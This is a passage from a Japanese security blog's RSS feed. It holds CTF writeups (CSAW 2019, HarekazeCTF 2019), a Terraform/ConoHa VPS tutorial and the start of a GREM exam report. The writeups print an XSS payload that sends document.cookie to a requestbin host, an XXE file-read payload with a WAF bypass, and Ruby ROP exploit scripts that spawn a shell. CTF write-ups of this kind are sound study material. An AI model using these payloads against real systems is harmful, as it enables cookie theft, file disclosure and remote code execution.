style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;

flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x7b&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x5f&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x7d&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x62&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6c&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x75&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;map(&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;:chr&lt;/span&gt;)

idxs&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
  &lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt; flag&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;flag{we_beleaf_in_your_re_future}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;

&lt;h3 id=&#34;baby-csp&#34;&gt;baby csp&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;CSPが有効なXSS問題

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;default-src &#39;self&#39;; script-src &#39;self&#39; *.google.com; connect-src *&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;上記のCSPからJSONPエンドポイントでのXSSを使う

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://inside.pixiv.blog/kobo/5137&#34;&gt;https://inside.pixiv.blog/kobo/5137&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;FLAGは、Cookieにあるので、requestbin を使ってPOSTさせるJavaScriptを埋め込む&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon(&#39;http://requestbin.net/r/ugix54ug&#39;, document.cookie)&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flag{csp_will_solve_EVERYTHING}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;unagi&#34;&gt;unagi&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;解けなかったのでwriteupを見た&lt;/li&gt;
&lt;li&gt;XMLがアップロードできるので、XXEだとわかるが、WAFがありいくつかのキーワード(ENTITYやSYSTEMなど)が使えない

&lt;ul&gt;
&lt;li&gt;PUBLIC は使えたりした&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;結論としては、UTF-8ではなくUTF-16BEでアップロードすればWAFをBypassできるというものだった

&lt;ul&gt;
&lt;li&gt;試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x_utf-16.xml&lt;/code&gt; などで作成してアップロードする
&lt;code&gt;xml
&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE root[
&amp;lt;!ENTITY pass SYSTEM &amp;quot;file:///flag.txt&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;users&amp;gt;
&amp;lt;user&amp;gt;
&amp;lt;username&amp;gt;alice2&amp;lt;/username&amp;gt;
&amp;lt;password&amp;gt;passwd1&amp;lt;/password&amp;gt;
&amp;lt;name&amp;gt;Alice2&amp;lt;/name&amp;gt;
&amp;lt;email&amp;gt;alice2@fakesite.com&amp;lt;/email&amp;gt;
&amp;lt;group&amp;gt;CSAW2019&amp;lt;/group&amp;gt;
&amp;lt;intro&amp;gt;&amp;amp;pass;&amp;lt;/intro&amp;gt;
&amp;lt;/user&amp;gt;
&amp;lt;/users&amp;gt;
&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flag{n0w_i&amp;rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>HarekazeCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/harekazectf2019/</link>
      <pubDate>Sun, 19 May 2019 16:54:53 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/harekazectf2019/</guid>
      <description>

&lt;h2 id=&#34;baby-rop-1&#34;&gt;Baby ROP 1&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;バイナリ中で、&lt;code&gt;system&lt;/code&gt; 関数使ってechoしており、Canary等もないBOFが起こるので、&lt;code&gt;pop rdi; ret&lt;/code&gt; 使って&lt;code&gt;system(/bin/sh)&lt;/code&gt; を呼ぶだけ&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;problem.harekaze.com&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;20001&lt;/span&gt;

pop_rdi_ret &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x00400683&lt;/span&gt;)
&lt;span style=&#34;color:#008000&#34;&gt;system&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x4005e3&lt;/span&gt;)

&lt;span style=&#34;color:#800&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gets
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;24&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; pop_rdi_ret
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x601048&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;system&lt;/span&gt;

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;baby-rop-2&#34;&gt;Baby ROP 2&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;system&lt;/code&gt; 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;problem.harekaze.com&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;20005&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
elf &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./babyrop2&amp;#34;&lt;/span&gt;
libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#libc = ELF.new &amp;#34;./mylibc.so.6&amp;#34;&lt;/span&gt;

pop_rdi_ret &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x00400733&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; pop_rdi_ret
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(elf&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;got&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;__libc_start_main&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x4004f0&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(elf&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;main&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;)
&lt;span style=&#34;color:#800&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gets
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

recvlen &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;length
data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; data
libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; u64(data&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;recvlen, &lt;span style=&#34;color:#666&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;ljust(&lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;__libc_start_main&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
libc_magic &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xf02a4&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc base 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_base
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc magic 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_magic
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;payload &lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(libc_magic)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;login&#34;&gt;Login&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;解けなかった、脆弱性わからず&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;harekaze-note&#34;&gt;Harekaze Note&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Terraform でConoha のインスタンスを立ててみる</title>
      <link>https://owlinux1000.github.io/blog/post/terraform_for_conoha/</link>
      <pubDate>Sat, 18 May 2019 12:24:26 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/terraform_for_conoha/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;最近(?)、自分の中で触ってみたかった技術の1つにTerraformがある。そこで今回は、Terraform でConoha のインスタンスを立ててみる。自分の中での理解をまとめているので間違いあれば教えてください。&lt;/p&gt;

&lt;h2 id=&#34;terraform-とは&#34;&gt;Terraform とは&lt;/h2&gt;

&lt;p&gt;Terraform は、Vagrant などで有名な&lt;a href=&#34;https://www.hashicorp.com/&#34;&gt;HashiCorp &lt;/a&gt;が開発しているツールで、クラウドサービスやOpenStack を対象に、独自の定義ファイルを用いてインスタンスの管理（構築・削除）を行うことができる。定義ファイルには、&lt;code&gt;HCL&lt;/code&gt; を用いて主に&lt;code&gt;tf&lt;/code&gt; ファイルに記載していく。私の第一印象としては、Ruby のDSL のような雰囲気を感じるが、&lt;code&gt;Vagrantfile&lt;/code&gt; ほどRuby 感はない。どちらかというと&lt;code&gt;json&lt;/code&gt; などに近い雰囲気だ。&lt;/p&gt;

&lt;h2 id=&#34;terraform-のインストール&#34;&gt;Terraform のインストール&lt;/h2&gt;

&lt;p&gt;今回は、MacBook Proで行っているので、&lt;code&gt;brew&lt;/code&gt; 経由でインストールする。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ brew install terraform&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、&lt;code&gt;HCL&lt;/code&gt;を書いていくためエディタ側にもプラグイン等をインストールしてあげよう。渡しの場合は、Emacsの&lt;code&gt;hcl-mode&lt;/code&gt;を導入してみた。&lt;/p&gt;

&lt;h2 id=&#34;定義ファイルの作成&#34;&gt;定義ファイルの作成&lt;/h2&gt;

&lt;p&gt;今回は、&lt;code&gt;main.tf&lt;/code&gt; というファイル名で以下の内容を作成した。以下の内容は、ほぼ&lt;a href=&#34;https://qiita.com/kaminchu/items/d0776c381213d54a3a69&#34;&gt;参考記事&lt;/a&gt; と同一である。今回は、勉強も兼ねているので、これを丁寧に読み解いていく。&lt;br /&gt;
まずはじめに、Provider の設定だ。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;provider &amp;#34;openstack&amp;#34; {
  user_name   = &amp;#34;hgoehoge&amp;#34;
  password    = &amp;#34;hagehage&amp;#34;
  tenant_name = &amp;#34;fugafuga&amp;#34;
  auth_url    = &amp;#34;https://identity.tyo1.conoha.io/v2.0&amp;#34;
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Provider の設定では、&lt;code&gt;provider&lt;/code&gt; キーワードを用いてブロックを定義する。次に、実際のProvider 名を設定するのだが、Conoha がOpenStack を使っているため、Provider に&lt;code&gt;openstack&lt;/code&gt; を設定する。ここには、&lt;code&gt;aws&lt;/code&gt; や&lt;code&gt;azure&lt;/code&gt; といった様々なクラウドサービスなどを指定することができる。今回の&lt;code&gt;openstack&lt;/code&gt;の場合は、API用のユーザ名やパスワード、テナントを名、認証用URLを設定する。&lt;br /&gt;
次に、Keypairについて見ていく。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;resource &amp;#34;openstack_compute_keypair_v2&amp;#34; &amp;#34;keypair&amp;#34; {
  name       = &amp;#34;terraform-keypair&amp;#34;
  public_key = &amp;#34;ssh-rsa hogehoge&amp;#34;
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここでは、構築したインスタンスにssh する際に利用する公開鍵の設定をしている。&lt;code&gt;resource&lt;/code&gt; ブロックを用いて、リソースを定義する。&lt;code&gt;resource&lt;/code&gt; キーワードの次に、リソースの種類、リソース名を設定する。このブロックの中では、一意に識別するための&lt;code&gt;name&lt;/code&gt; や公開鍵を貼り付ける&lt;code&gt;public_key&lt;/code&gt; を設定している。&lt;/p&gt;

&lt;p&gt;次に、実際にインスタンス自体の設定について見ていく。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;resource &amp;#34;openstack_compute_instance_v2&amp;#34; &amp;#34;basic&amp;#34; {
  name        = &amp;#34;basic&amp;#34;                             # 好きな名前
  image_name  = &amp;#34;vmi-ubuntu-18.04-amd64-20gb&amp;#34;
  flavor_name = &amp;#34;g-512mb&amp;#34;
  key_pair    = &amp;#34;terraform-keypair&amp;#34;
  security_groups = [
    &amp;#34;gncs-ipv4-all&amp;#34;,
  ]
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;こちらも、先程と同様に&lt;code&gt;resource&lt;/code&gt; ブロックを使って定義する。インスタンス自体の設定に関しては、&lt;code&gt;openstack_compute_instance_v2&lt;/code&gt; で設定できるようだ。&lt;code&gt;image_name&lt;/code&gt; や&lt;code&gt;flavor_name&lt;/code&gt; は、ConohaのAPIを使って設定できる値がわかるので、その値を設定する。今回は最安値プランのVPS構成だ。また、&lt;code&gt;key_pair&lt;/code&gt; には先程定義した&lt;code&gt;name&lt;/code&gt; 設定する。最後に、&lt;code&gt;security_groups&lt;/code&gt; では、通信許可に関する設定だが、今回はIPv4における全開放を指定している。&lt;/p&gt;

&lt;p&gt;今回は、設定ファイルにクレデンシャル情報をハードコードしているが、実際には環境変数で渡したり別ファイルに定義したりなどを行うように注意する。&lt;/p&gt;

&lt;h2 id=&#34;terraform-の実行&#34;&gt;Terraform の実行&lt;/h2&gt;

&lt;p&gt;Terraform では、まずはじめに&lt;code&gt;init&lt;/code&gt; サブコマンドを実行する。ここで、Provider用のプラグインや各種初期化処理などが走る。次に、&lt;code&gt;plan&lt;/code&gt; サブコマンドを用いて、実行計画の作成など実際に行われる処理の確認ができる。そして、&lt;code&gt;apply&lt;/code&gt; サブコマンドを用いて、実際に処理を実行させる。また、削除した場合は、&lt;code&gt;destroy&lt;/code&gt; サブコマンドを利用する。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ terraform init
...(skip)
$ terraform plan
...(skip)
$ terraform apply&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;apply&lt;/code&gt; サブコマンドが成功すると結果が出力されるので、そのIP アドレスに対して、ssh すると構築されたサーバにアクセスできることがわかる。また、ssh が確認できたら&lt;code&gt;destroy&lt;/code&gt; サブコマンドを実行してみるとインスタンスが削除されている。ここらへんは、逐次実行しながらConoha のコンパネを見ると具体的なイメージが湧きやすい。&lt;/p&gt;

&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;今回は、既存の記事を参考にTerraform を使ってConoha にVPSを構築してみた。若干~元記事に騙されて時間をとかしたが、実際に構築することができた。これがあれば、また新しくVPS を立てたいときやイベントを行う際などには便利だと思った。もうちょっと使い道を模索して慣れていきたい。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>GIAC Reverse Engineering Malware（GREM）合格体験記</title>
      <link>https://owlinux1000.github.io/blog/post/passed_grem/</link>
      <pubDate>Fri, 03 May 2019 14:32:45 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/passed_grem/</guid>
      <description>

&lt;h2 id=&#34;tl-dr&#34;&gt;tl;dr&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.giac.org/certification/reverse-engineering-malware-grem&#34;&gt;GIAC Reverse Engineering Malware（GREM）&lt;/a&gt; に 81.33% で合格した&lt;/li&gt;
&lt;li&gt;勉強方法

&lt;ul&gt;
&lt;li&gt;受講したトレーニングのテキストを読み込むのと、演習をすべてやり直す&lt;/li&gt;
&lt;li&gt;模擬試験を本番と同様の状況で受ける（紙の辞書やテキストを用意して）&lt;/li&gt;
&lt;li&gt;少しでも詰まった概念などについては、ググって知識を補完した&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;トレーニング以外の総合計勉強時間は30 ~ 40時間ほど&lt;/li&gt;
&lt;li&gt;試験言語は、英語だが英語自体の難易度は高くない

&lt;ul&gt;
&lt;li&gt;よっぽど英語に自信がない限りは、保険のために紙の辞書を持っていくと良い&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

